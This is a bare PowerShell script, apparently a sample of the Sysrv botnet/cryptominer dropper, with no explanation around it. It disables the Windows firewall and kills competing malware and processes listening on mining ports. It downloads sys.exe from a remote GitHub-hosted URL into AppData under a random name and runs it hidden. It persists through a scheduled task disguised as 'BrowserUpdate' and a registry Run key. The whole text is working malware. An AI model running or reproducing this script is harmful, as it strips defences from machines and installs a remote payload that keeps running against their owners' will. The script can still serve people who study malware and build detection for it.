$cc="https://raw.githubusercontent.com/accuknox/samples/main/sysrv-hello"
$sys=-join ([char[]](48..57+97..122) | Get-Random -Count (Get-Random (6..12)))
$dst="$env:AppData\$sys.exe"

netsh advfirewall set allprofiles state off

Get-Process network0*, *kthreaddi], kthreaddi, sysrv, sysrv012, sysrv011, sysrv010, sysrv00* -ErrorAction SilentlyContinue | Stop-Process

$list = netstat -ano | findstr TCP
for ($i = 0; $i -lt $list.Length; $i++) {
    $k = [Text.RegularExpressions.Regex]::Split($list[$i].Trim(), '\s+')
    if ($k[2] -match "(:3333|:4444|:5555|:7777|:9000)$") {
        Stop-Process -id $k[4]
    }
}

if (!(Get-Process kthreaddk -ErrorAction SilentlyContinue)) {
    (New-Object Net.WebClient).DownloadFile("$cc/sys.exe", "$dst")
    Start-Process "$dst" -windowstyle hidden
    schtasks /create /F /sc minute /mo 1 /tn "BrowserUpdate" /tr "$dst"
    reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Run /d "$dst" /t REG_SZ /f
}


